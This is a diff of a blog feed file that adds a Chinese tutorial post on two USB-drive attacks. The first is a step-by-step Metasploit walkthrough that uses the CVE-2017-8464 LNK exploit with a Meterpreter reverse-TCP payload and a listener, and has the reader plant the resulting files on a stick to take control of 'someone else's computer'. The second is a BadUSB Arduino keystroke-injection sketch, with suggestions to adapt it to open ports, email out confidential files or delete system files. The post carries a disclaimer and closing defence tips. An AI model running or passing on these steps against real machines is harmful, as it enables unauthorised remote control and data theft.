@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>两种常见的U盘攻击手段</title>
+      <link href="/%E4%B8%A4%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84U%E7%9B%98%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5/"/>
+      <url>/%E4%B8%A4%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84U%E7%9B%98%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p align="left"><font size="3">在数字化时代，U盘成为了我们日常生活中不可或缺的存储设备之一。然而，正是因为其普遍性和便携性，U盘也成为了黑客们进行攻击的理想工具。通过利用各种技术手段，他们可以在U盘中隐藏恶意文件，或者直接从固件入手，在固件里植入恶意代码，从而获取用户的敏感信息或者破坏系统安全。这种攻击方式被称为“摆渡攻击”。下面将介绍两种常用的U盘攻击手段，希望大家能够了解相关技术，增强防范意识。</font></p><p align="center"><font size="3"><b>注意，以下教程仅供学习，请勿用于非法用途。</b></font></p><h2 id="U盘文件病毒"><a href="#U盘文件病毒" class="headerlink" title="U盘文件病毒"></a>U盘文件病毒</h2><p align="left"><font size="3">原理：在U盘里放入病毒文件，当用户浏览病毒文件时发起攻击。</font></p><p align="left"><font size="3">准备工具：一台电脑、Kali Linux系统（<a href="/黑客常用操作系统-kali-linux的安装与使用/" target="_blank">安装教程</a>）、一个U盘（最好是空的）</font></p><p align="center"><font size="3">启动msfconsole</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-1.png" alt="img"></p><p align="center"><font size="3">搜索漏洞模块</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-8464</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-2.png" alt="img"></p><p align="center"><font size="3">使用漏洞攻击模块</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/fileformat/cve_2017_8464_lnk_rce</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-3.png" alt="img"></p><p align="center"><font size="3">查看是否有需要填写的信息</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-4.png" alt="img"></p><p align="center"><font size="3">设置payload</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-5.png" alt="img"></p><p align="center"><font size="3">填写LHOST，即攻击者机器的内网IP（一般都是本机的内网IP）</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.X.XXX</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-6.png" alt="img"></p><p align="center"><font size="3">运行攻击模块</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-7.png" alt="img"></p><p align="center"><font size="3">在/root/.msf4/local/目录下会生成很多病毒文件（FlashPlayerCPLApp.cpl是主文件）</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-8.png" alt="img"></p><p align="center"><font size="3">将以上所有文件都复制到U盘里（一般是根目录）</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-9.png" alt="img"></p><p align="center"><font size="3">使用监听模块</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-10.png" alt="img"></p><p align="center"><font size="3">设置payload</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-11.png" alt="img"></p><p align="center"><font size="3">填写LHOST（同上）</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.X.XXX</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-12.png" alt="img"></p><p align="center"><font size="3">运行监听模块</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-13.png" alt="img"></p><p align="left"><font size="3">将U盘插入别人的电脑，点击FlashPlayerCPLApp.cpl文件后就可以获得目标电脑的控制权（如果对方电脑存在LNK漏洞的话，无需手动点击，只要浏览了FlashPlayerCPLApp.cpl所在文件夹就会自动运行病毒脚本）</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-14.png" alt="img"></p><p align="center"><font size="3">可以通过shell直接操作对方的电脑</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-15.png" alt="img"></p><p align="left"><font size="3">以上病毒文件都没有进行免杀，所以杀毒软件可以检测出来。如果进行了免杀并且修改了FlashPlayerCPLApp.cpl文件的文件名和图标等信息，完全可以达到深度伪装的效果</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-16.png" alt="img"></p><h2 id="U盘固件病毒"><a href="#U盘固件病毒" class="headerlink" title="U盘固件病毒"></a>U盘固件病毒</h2><p align="left"><font size="3">原理：使用定制的主板制作BadUSB，将恶意代码植入固件里，只要U盘一插入电脑就会运行恶意代码。直接在某宝上搜索BadUSB就可以买到伪装成普通U盘的BadUSB。</font></p><p align="left"><font size="3">准备工具：一台电脑、Kali Linux系统（<a href="/黑客常用操作系统-kali-linux的安装与使用/" target="_blank">安装教程</a>）、一个BadUSB、Arduino软件（<a href="/【arduino单片机入门】环境配置及完整使用流程/" target="_blank">安装教程</a>）</font></p><p align="center"><font size="3">将BadUSB U盘插到电脑上</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-17.png" alt="img"></p><p align="center"><font size="3">打开Arduino软件，选择Leonardo开发板（一般网上买的都是这款，但也有可能是其他的，注意看商品详情）和U盘对应的端口</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-18.png" alt="img"></p><p align="center"><font size="3">编写程序代码（以下是参考代码）</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line">void setup()&#123;//初始化 </span><br><span class="line">Keyboard.begin();//开始键盘通讯 </span><br><span class="line">delay(2000);//延时 </span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键 </span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">delay(500); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.release(&#x27;r&#x27;); //win+r打开运行窗口</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);//锁定大写绕过中文输入法</span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(&quot;NOTEPAD&quot;);//打开记事本</span><br><span class="line">delay(1000);</span><br><span class="line">Keyboard.println(&quot;HELLO WORLD!&quot;);//输出内容</span><br><span class="line">delay(1000);</span><br><span class="line">//Keyboard.press(KEY_RETURN); </span><br><span class="line">//Keyboard.release(KEY_RETURN);//关闭窗口</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK); </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);//恢复小写</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125;</span><br><span class="line">void loop() &#123;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-19.png" alt="img"></p><p align="center"><font size="3">检查代码是否有误，没问题就进行烧录</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-20.png" alt="img"></p><p align="center"><font size="3">将U盘插到别人的电脑上就会自动运行病毒代码</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-21.png" alt="img"></p><p align="left"><font size="3">想要达到什么目的都可以通过修改上面的代码来实现，比如：打开特定端口，方便入侵控制电脑；获取电脑上的机密资料，通过邮件发送到我们的邮箱；删除电脑核心文件，造成电脑瘫痪死机……</font></p><p><img src="https://ximfem-1300967967.cos.ap-guangzhou.myqcloud.com/blog/20231007-22.png" alt="img"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p align="left"><font size="3">在日常使用U盘时，我们应该始终保持警惕，并采取一些简单但有效的防范措施，例如，不要随意使用他人的U盘，定期更新杀毒软件并扫描U盘中的文件，避免下载来路不明的文件等等。此外，了解常见的U盘攻击手段，也能帮助我们更好地预防和应对潜在的威胁。</font></p><p align="left"><font size="3"><b>特别提醒，虽然这种攻击手段的载体通常是U盘，但其实任何USB插口都有可能成为攻击载体，比如充电宝、数据线等，因此尽量不要轻易使用来历不明的USB设备！</b></font></p><p><img src="\img\123.gif" /></p><p><img src="\img\ewm.png" style="zoom:50%;" /></p><p align="center"><font color="grey" size="3">（部分素材来源于网络，如有侵权请联系作者删除）</font></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+          <category> 原创 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> U盘 </tag>
+            
+            <tag> BadUSB </tag>
+            
+            <tag> 攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>我们的Ai集合站 — TPAI正式上线运营</title>
       <link href="/%E6%88%91%E4%BB%AC%E7%9A%84Ai%E9%9B%86%E5%90%88%E7%AB%99-%E2%80%94-TPAI%E6%AD%A3%E5%BC%8F%E4%B8%8A%E7%BA%BF%E8%BF%90%E8%90%A5/"/>
       <url>/%E6%88%91%E4%BB%AC%E7%9A%84Ai%E9%9B%86%E5%90%88%E7%AB%99-%E2%80%94-TPAI%E6%AD%A3%E5%BC%8F%E4%B8%8A%E7%BA%BF%E8%BF%90%E8%90%A5/</url>
@@ -235,9 +266,9 @@
       
         <tags>
             
-            <tag> 网站 </tag>
-            
             <tag> Github </tag>
+            
+            <tag> 网站 </tag>
             
             <tag> Netlify </tag>
             
@@ -766,9 +797,9 @@
             
             <tag> 系统 </tag>
             
-            <tag> VMware </tag>
-            
             <tag> Mac </tag>
+            
+            <tag> VMware </tag>
             
         </tags>
       
@@ -853,9 +884,9 @@
       
         <tags>
             
-            <tag> wifi </tag>
-            
             <tag> 钓鱼 </tag>
+            
+            <tag> wifi </tag>
             
         </tags>
       
